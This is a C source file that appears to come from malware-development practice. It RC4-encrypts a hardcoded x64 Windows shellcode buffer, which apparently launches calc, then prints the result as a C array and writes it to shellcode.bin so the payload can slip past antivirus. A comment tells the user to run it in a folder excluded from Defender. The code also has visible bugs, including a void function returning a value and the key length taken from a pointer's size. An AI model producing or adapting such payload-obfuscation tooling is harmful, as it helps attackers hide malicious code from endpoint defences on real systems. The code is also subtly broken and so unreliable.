// Run this script in a folder exceptioned by Defender.
#include <stdio.h>
#include <Windows.h>

unsigned char plaintext[] = {
	// ... (shellcode bytes)
	0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51,
	0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52,
	0x60, 0x48, 0x8B, 0x52, 0x18, 0x48, 0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72,
	0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
	0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B,
	0x42, 0x3C, 0x48, 0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
	0x85, 0xC0, 0x74, 0x67, 0x48, 0x01, 0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44,
	0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48, 0xFF, 0xC9, 0x41,
	0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
	0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1,
	0x4C, 0x03, 0x4C, 0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44,
	0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0, 0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44,
	0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04, 0x88, 0x48, 0x01,
	0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
	0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41,
	0x59, 0x5A, 0x48, 0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48,
	0xBA, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D,
	0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F, 0x87, 0xFF, 0xD5,
	0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
	0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0,
	0x75, 0x05, 0xBB, 0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89,
	0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C, 0x63, 0x00
};

typedef struct
{
	unsigned int i;
	unsigned int j;
	unsigned char s[256];

} Rc4Context;


void rc4Init(Rc4Context* context, const unsigned char* key, size_t length)
{
	unsigned int i;
	unsigned int j;
	unsigned char temp;

	// Check parameters
	if (context == NULL || key == NULL)
		return ERROR_INVALID_PARAMETER;

	// Clear context
	context->i = 0;
	context->j = 0;

	// Initialize the S array with identity permutation
	for (i = 0; i < 256; i++)
	{
		context->s[i] = i;
	}

	// S is then processed for 256 iterations
	for (i = 0, j = 0; i < 256; i++)
	{
		//Randomize the permutations using the supplied key
		j = (j + context->s[i] + key[i % length]) % 256;

		//Swap the values of S[i] and S[j]
		temp = context->s[i];
		context->s[i] = context->s[j];
		context->s[j] = temp;
	}

}


void rc4Cipher(Rc4Context* context, const unsigned char* input, unsigned char* output, size_t length) {
	unsigned char temp;

	// Restore context
	unsigned int i = context->i;
	unsigned int j = context->j;
	unsigned char* s = context->s;

	// Encryption loop
	while (length > 0)
	{
		// Adjust indices
		i = (i + 1) % 256;
		j = (j + s[i]) % 256;

		// Swap the values of S[i] and S[j]
		temp = s[i];
		s[i] = s[j];
		s[j] = temp;

		// Valid input and output?
		if (input != NULL && output != NULL)
		{
			//XOR the input data with the RC4 stream
			*output = *input ^ s[(s[i] + s[j]) % 256];

			//Increment data pointers
			input++;
			output++;
		}

		// Remaining bytes to process
		length--;
	}

	// Save context
	context->i = i;
	context->j = j;
}


int main() {

	printf("[i] Base Address of Plaintext Shellcode : 0x%p \n", plaintext);
	printf("[!] Encrypting shellcode..\n");

	// Initialization
	Rc4Context ctx = { 0 };

	// Key used for encryption
	unsigned char* key = "bWFsZGV2MTIzCg==";

	rc4Init(&ctx, key, sizeof(key));

	size_t shellcodeLength = sizeof(plaintext);
	DWORD flAllocationType = MEM_COMMIT | MEM_RESERVE;
	DWORD flProtect = PAGE_EXECUTE_READWRITE;
	unsigned char* ciphertext = (unsigned char*)VirtualAlloc(NULL, shellcodeLength, flAllocationType, flProtect);

	if (!ciphertext)
	{
		fprintf(stderr, "Error allocating memory for the encrypted shellcode.\n");
		return EXIT_FAILURE;
	}

	printf("[+] Base Address of Allocated Memory for Encrypted Shellcode: 0x%p\n", ciphertext);

	// Encryption //
	// plaintext - The payload to be encrypted
	// ciphertext - A buffer that is used to store the outputted encrypted data
	rc4Cipher(&ctx, plaintext, ciphertext, shellcodeLength);
	
	//output encrypted shellcode to terminal
	printf("\nunsigned char pPayload[] = {");

	for (int i = 0; i < shellcodeLength; ++i) {
		if (i % 16 == 0) printf("\n    ");
		printf("0x%02x", ciphertext[i]);
		if (i < shellcodeLength - 1) printf(", ");
	}

	printf("\n};\n");

	HANDLE file;
	DWORD bytes_written;
	size_t encshellcodeSize = shellcodeLength;

	file = CreateFileA("shellcode.bin", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL, NULL);
	if (file == INVALID_HANDLE_VALUE) {
		printf("Unable to create bin file.\n");
		return 1;
	}

	if (!WriteFile(file, ciphertext, (DWORD)encshellcodeSize, &bytes_written, NULL)) {
		fprintf(stderr, "Failed to write to file.\n");
		CloseHandle(file);
		return 1;
	}

	printf("shellcode.bin file created!");

	//clean up
	CloseHandle(file);

	return 0;
}